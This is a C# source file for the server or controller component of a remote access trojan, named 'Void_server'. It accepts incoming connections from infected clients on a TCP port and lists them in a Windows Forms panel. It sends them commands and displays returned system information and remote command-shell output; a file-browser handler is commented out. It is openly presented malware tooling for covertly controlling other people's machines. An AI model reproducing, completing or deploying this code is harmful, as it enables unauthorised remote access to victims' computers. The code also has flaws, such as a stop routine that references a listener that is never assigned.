using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Drawing;
using System;
using System.Text;
using Void_server.Controls;
using Void_server.Popups;

namespace Void_server.Libs
{
    class RAT
    {
        public static MainForm caller { get; set; }
        public static Panel clientPanel { get; set; }
        private static TcpListener server { get; set; }
        static int newestBarOffset = 0;

        public static async void StartServer(int port)
        {
            clientPanel = (Panel)caller.Controls.Find("mainPanel", false)[0].Controls.Find("clientsPanel", false)[0];

            TcpListener listener = new TcpListener(IPAddress.Any, port);
            listener.Start();

            await Task.Run(() =>
            {
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();

                    CreateNewClientBar(client);
                }
            });
        }

        public static void StopServer(int port)
        {
            server.Stop();
        }

        public static void HandleInput(string input, ClientBar bar)
        {
            string[] splitted = input.Split('|');

            if (splitted.Length < 1)
                return;

            switch (splitted[0])
            {
                case "info":
                    HandleInformation(splitted, bar);
                    break;
                case "error":
                    ShowResult($"Error type: {splitted[1]}\r\n{splitted[2]}");
                    break;
                case "cmd":
                    MainForm.cmd.AddText(splitted[1]);
                    break;/*
                case "fbrowser":
                    string[] paths = splitted[2].Split('*');

                    if (splitted[1] == "main")
                        Form1.fBrowser.Add(paths, true);
                    else
                        Form1.fBrowser.Add(paths);
                    break;*/
            }

            bar.session.stream.Flush();
        }

        private static void HandleInformation(string[] args, ClientBar bar = null)
        {
            switch (args[1])
            {
                case "general":
                    bar.SetProperties(RemoveIndex(RemoveIndex(args, 0), 0));
                    break;
                default:
                    ShowResult(args[2]);
                    break;
            }
        }

        private static void ShowResult(string result)
        {
            GatheringResultForm gResult = new GatheringResultForm(result);
            gResult.ShowDialog();
        }

        public static void Send(string command, ClientBar bar = null)
        {
            //convert the command into bytes (also add a | to cut out the backslash-zero stuff)
            byte[] bytes = Encoding.ASCII.GetBytes(command + "|");

            //send it
            if (bar == null)
                MainForm.currentSelectedBar.session.SendCommand(bytes);
            else
                bar.session.SendCommand(bytes);
        }
        
        public static void CreateNewClientBar(TcpClient client)
        {
            if (clientPanel.Controls.Count == 0)
                newestBarOffset = 0;

            //create a new bar and set the location
            ClientBar bar = new ClientBar(client);
            bar.Location = new Point(0, newestBarOffset);

            //add the client bar to the container
            clientPanel.Invoke(new Action(() => clientPanel.Controls.Add(bar)));

            //update the bar offset
            newestBarOffset += bar.Height;
        }

        public static string RecieveInformation(RATSession session)
        {
            byte[] bytes = new byte[1024];

            try
            {
                session.stream.Read(bytes, 0, bytes.Length);
            }
            catch (Exception)
            {
                session.Stop();
            }

            return Encoding.ASCII.GetString(bytes);
        }

        private static string[] RemoveIndex(string[] arr, int index)
        {
            //create a list version of the array
            List<string> temp = arr.ToList();

            //remove the item at the given index
            temp.Remove(temp[index]);

            return temp.ToArray(); //return the result
        }
    }
}